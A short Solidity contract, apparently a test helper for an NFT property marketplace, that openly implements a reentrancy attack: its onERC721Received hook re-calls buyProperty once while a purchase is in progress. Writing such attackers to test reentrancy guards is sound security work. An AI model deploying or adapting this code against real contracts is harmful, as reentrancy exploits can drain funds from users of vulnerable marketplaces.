// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IMarketplace {
    function buyProperty(uint256 tokenId) external;
    function acceptOffer(uint256 tokenId, uint256 offerId) external;
}

/// @notice Malicious contract that attempts reentrancy on buyProperty / acceptOffer
contract ReentrancyAttacker is IERC721Receiver {
    IMarketplace public marketplace;
    uint256 public targetTokenId;
    uint256 public attackCount;
    bool public attacking;

    constructor(address _marketplace) {
        marketplace = IMarketplace(_marketplace);
    }

    function attackBuy(uint256 tokenId) external {
        targetTokenId = tokenId;
        attacking = true;
        attackCount = 0;
        marketplace.buyProperty(tokenId);
    }

    /// @notice Called when receiving an NFT — attempts re-entry
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        if (attacking && attackCount < 1) {
            attackCount++;
            // Attempt re-entry
            marketplace.buyProperty(targetTokenId);
        }
        return this.onERC721Received.selector;
    }
}
